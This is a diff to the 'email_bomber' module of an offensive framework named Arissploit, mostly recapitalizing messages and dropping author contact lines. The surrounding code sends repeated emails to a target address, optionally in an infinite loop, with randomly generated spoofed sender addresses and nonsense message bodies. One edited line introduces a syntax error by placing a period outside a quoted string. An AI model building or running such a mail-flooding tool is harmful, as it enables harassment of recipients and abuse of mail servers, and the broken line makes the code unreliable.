@@ -1,5 +1,3 @@
-
-
 from core.arissploit import *
 from core import colors
 import smtplib
@@ -12,10 +10,8 @@ from string import ascii_lowercase
 conf = {
 	"name": "email_bomber",
 	"version": "1.0",
-	"shortdesc": "spam email to target email",
-	"author": "entynetproject",
-	"github": "entynetproject",
-	"email": "entynetproject0@gmail.com",
+	"shortdesc": "Spam email to target email.",
+	"author": "Entynetproject",
 	"initdate": "5.4.2016",
 	"lastmod": "3.1.2017",
 	"apisupport": True
@@ -23,19 +19,19 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('my_username', ['username', 'username for login']),
-	('my_password', ['yourpassword', 'password for login']),
-	('smtp', ['smtp.server.com', 'smtp server']),
-	('smtp_port', [587, 'smtp server port(must be int)']),
-	('from_email', ['from@email.com', 'from email']),
-	('to_email', ['target@email.com', 'to email']),
-	('subject', ['hello', 'subject']),
-	('message', ['im email bomber', 'message']),
-	('amount', [1, 'amount of emails(0 = infinite/must be int)']),
-	('starttls', [0, 'use starttls(0 = no/1 =yes)']),
-	('login', [0, 'use login(0 = no/1 = yes)']),
-	('random_email', [1, 'generate random email(0 = no/1 = yes)']),
-	('random_message', [1, 'generate random message(0 = no/1 = yes)']),
+	('my_username', ['username', 'Username for login'.]),
+	('my_password', ['yourpassword', 'Password for login.']),
+	('smtp', ['smtp.server.com', 'SMTP server.']),
+	('smtp_port', [587, 'SMTP server port (must be int).']),
+	('from_email', ['from@email.com', 'From email.']),
+	('to_email', ['target@email.com', 'To email.']),
+	('subject', ['hello', 'Subject.']),
+	('message', ['hello', 'Message.']),
+	('amount', [1, 'Amount of emails (0 = infinite/must be int).']),
+	('starttls', [0, 'Use starttls (0 = no/1 =yes).']),
+	('login', [0, 'Use login (0 = no/1 = yes).']),
+	('random_email', [1, 'Generate random email (0 = no/1 = yes).']),
+	('random_message', [1, 'Generate random message (0 = no/1 = yes).']),
 ))
 
 s_nouns = ["A dude", "My mom", "The king", "Some guy", "A cat with rabies", "A sloth", "Your homie", "This cool guy my gardener met yesterday", "Superman", "Super Mario", "Human", "Robot", "Boy", "Girl"]
@@ -44,7 +40,7 @@ s_verbs = ["eats", "kicks", "gives", "treats", "meets with", "creates", "hacks",
 p_verbs = ["eat", "kick", "give", "treat", "meet with", "create", "hack", "configure", "spy on", "retard", "meow on", "flee from", "try to automate", "explode"]
 infinitives = ["to make a pie.", "for no apparent reason.", "because the sky is green.", "for a disease.", "to be able to make toast explode.", "to know more about archeology.", "because the sky is blue"]
 
-option_notes = colors.yellow+" this module may not work with gmail, yahoo, yandex\n please run your own smtp!"+colors.end
+option_notes = colors.yellow+"This module may not work with gmail, yahoo, yandex\n please run your own SMTP!"+colors.end
 # Simple changelog
 changelog = "Version 1.0:\nrelease"
 
@@ -64,17 +60,17 @@ def run():
 	try:
 		server = smtplib.SMTP(variables['smtp'][0], int(variables['smtp_port'][0]))
 	except(ValueError):
-		printError("port number must be int")
-		return ModuleError("port number must be int")
+		printError("Port number must be int!")
+		return ModuleError("Port number must be int!")
 	except socket.gaierror:
-		printError("cannot reach smtp server")
-		return ModuleError("cannot reach smtp server")
+		printError("Cannot reach SMTP server!")
+		return ModuleError("Cannot reach SMTP server!")
 	except(ConnectionRefusedError):
-		printError("connection refused")
-		return ModuleError("connection refused")
+		printError("Connection refused!")
+		return ModuleError("Connection refused!")
 	except(TimeoutError):
-		printError("timeout cannot reach smtp server")
-		return ModuleError("timeout cannot reach smtp server")
+		printError("Timeout cannot reach SMTP server!")
+		return ModuleError("Timeout cannot reach SMTP server!")
 	if int(variables['starttls'][0]) == 1:
 		server.starttls()
 	if int(variables['login'][0]) == 1:
@@ -94,7 +90,7 @@ def run():
 				printSuccess("email sended")
 
 	if int(variables['amount'][0]) == 0:
-		printInfo("starting infinite loop (ctrl+c) to end")
+		printInfo("Starting infinite loop... Ctrl + C to end.")
 		while True:
 			if int(variables['random_email'][0]) == 1:
 					fakemail = generate_random_email()
@@ -104,7 +100,7 @@ def run():
 					words = " ".join(list0)
 					msg.attach(MIMEText(words, 'html'))
 			server.sendmail(fromaddr, toaddr, text)
-			printSuccess("email sended")
+			printSuccess("Email sended.")
 	server.quit()
 
 def get_random_domain(domains):
